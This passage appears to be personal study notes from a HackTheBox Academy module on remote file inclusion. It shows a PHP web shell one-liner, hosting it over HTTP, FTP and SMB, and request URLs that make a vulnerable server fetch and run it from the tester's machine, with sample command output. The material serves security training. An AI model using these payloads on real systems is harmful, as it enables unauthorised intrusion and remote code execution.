if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `include`                    |        ✅         |      ✅      |       ✅        |
we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.
## Verify RFI
Method 1:reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL` to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (`http://127.0.0.1:80/index.php`) as our input string and see if it gets included:
```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/existingpage.php
```

**Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.


METHOD 2: through ini file, less reliable
any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.
```
 echo '<PHP.INI?>B64' | base64 -d | grep allow_url_include

allow_url_include = On
```
## RCE Through RFI
```shell
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 # start a listener
 sudo python3 -m http.server 8000
```
browse to our ip via RFI
```
/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

![[Pasted image 20251009154541.png]]
**Tip:** We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload

## FTP

As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:
```shell
sudo python -m pyftpdlib -p 21
```

This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL, as follows:
![[Pasted image 20251009154648.png]]
```shell-session
 curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## smb
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:

```shell-session
magdy3660@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:

![Shipping containers and cranes at a port with NT AUTHORITY\IUSR information displayed.](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.

